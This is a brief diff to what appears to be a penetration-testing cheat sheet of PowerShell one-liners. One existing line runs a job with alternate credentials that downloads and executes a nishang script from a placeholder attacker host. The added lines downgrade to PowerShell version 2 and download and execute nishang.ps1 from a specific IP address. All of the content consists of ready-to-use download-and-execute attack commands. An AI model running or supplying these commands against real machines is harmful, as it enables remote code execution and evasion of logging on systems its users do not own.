@@ -41,3 +41,6 @@
 
 # Start a job with alternative creds
 `Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')}`
+
+# Jump to powershell v2
+`Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"`
